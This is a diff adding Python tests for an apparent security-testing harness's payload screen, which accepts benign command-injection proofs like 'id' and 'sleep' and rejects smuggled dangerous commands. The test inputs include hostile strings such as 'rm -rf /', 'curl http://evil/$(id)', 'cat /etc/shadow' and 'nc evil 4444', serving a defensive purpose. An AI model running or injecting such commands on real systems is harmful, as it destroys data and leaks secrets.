@@ -124,3 +124,26 @@ def test_ssrf_positives_are_all_oob():
 def test_marker_token_extraction():
     assert _marker_token("<script>document.title='abc123'</script>") == "abc123"
     assert _marker_token("<img src='http://x/?k9z8y7'>") == "k9z8y7"
+
+
+def _ci_case(val, cmd, control=False):
+    from bbh.cases.base import TestCase
+    tech = "command_injection.control.baseline" if control else "command_injection.semicolon.x"
+    return TestCase(case_no=0 if control else 1, technique=tech, payload=val,
+                    mutation=[{"op": "set_input", "value": val}], is_control=control,
+                    positive={"type": "body_regex", "pattern": "x"}, negative="n",
+                    extra=({} if control else {"rce_cmd": cmd}))
+
+
+def test_command_injection_screen_allows_only_benign_proofs():
+    # benign id/whoami/sleep proofs are allowed even though they contain shell metacharacters
+    assert screen_payload(_ci_case("q;id", "id")) == []
+    assert screen_payload(_ci_case("q$(whoami)", "whoami")) == []
+    assert screen_payload(_ci_case("q;sleep 5", "sleep")) == []
+    assert screen_payload(_ci_case("q", "", control=True)) == []  # the control carries no command
+    # a second, dangerous command smuggled behind a benign declaration is still rejected
+    assert screen_payload(_ci_case("q;id;rm -rf /", "id"))
+    assert screen_payload(_ci_case("q;curl http://evil/$(id)", "id"))
+    assert screen_payload(_ci_case("q;cat /etc/shadow", "id"))
+    # a non-benign declared command is rejected outright
+    assert screen_payload(_ci_case("q;nc evil 4444", "nc"))
